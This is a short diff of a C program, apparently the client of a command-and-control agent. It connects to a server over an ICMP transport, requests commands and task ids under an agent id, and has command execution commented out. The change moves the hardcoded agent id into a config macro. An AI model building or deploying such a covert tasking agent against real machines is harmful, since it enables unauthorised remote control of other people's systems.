@@ -1,3 +1,4 @@
+#include "config.h"
 #include "transport.h"
 #include "executable.h"
 
@@ -9,9 +10,8 @@
 //перед любым взаимодействием с сервером - INIT и в конце не забыть cleanup после каждого INIT!!!
 
 int main() {
+    //TODO исправить
     TransportModule *active_channel = &icmp_transport;
-
-    char agent_id[] = "agent_999";//for test
     
     char task_id[5] = {0};
     char command[256] = {0};
@@ -21,7 +21,7 @@ int main() {
         printf("Подключение к серверу...\n");
         if(active_channel->init() == 0) {
             printf("К серверу подключен...\n");
-            if(active_channel->get_command(command, task_id,  sizeof(command), sizeof(task_id), agent_id) == 0) {
+            if(active_channel->get_command(command, task_id,  sizeof(command), sizeof(task_id), AGENT_ID) == 0) {
                 active_channel->cleanup();
                 //execute_command(command, result, sizeof(result));
                 //sleep(1);
